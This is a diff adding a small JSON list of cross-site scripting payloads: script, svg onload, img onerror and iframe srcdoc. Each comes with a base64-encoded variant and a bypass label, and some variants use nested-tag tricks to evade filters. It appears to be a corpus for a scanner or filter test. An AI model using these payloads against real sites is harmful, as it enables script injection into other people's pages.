@@ -1,0 +1,26 @@
+[
+  {
+    "type": "xss",
+    "original": "<script>alert(1)</script>",
+    "payload": "PHNjcjxzY3JpcHQ+aXB0PmFsZXJ0KDEpPC9zY3JpcHQ+",
+    "bypass": "basic"
+  },
+  {
+    "type": "xss",
+    "original": "<svg/onload=alert(1)>",
+    "payload": "PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+",
+    "bypass": "svg"
+  },
+  {
+    "type": "xss",
+    "original": "<img src=x onerror=alert('XSS')>",
+    "payload": "PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCdYU1MnKT4=",
+    "bypass": "onerror"
+  },
+  {
+    "type": "xss",
+    "original": "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
+    "payload": "PGlmcmFtZSBzcmNkb2M9JzxzY3I8c2NyaXB0PmlwdD5hbGVydCgxKTwvc2NyaXB0Pic+PC9pZnJhbWU+",
+    "bypass": "srcdoc"
+  }
+]
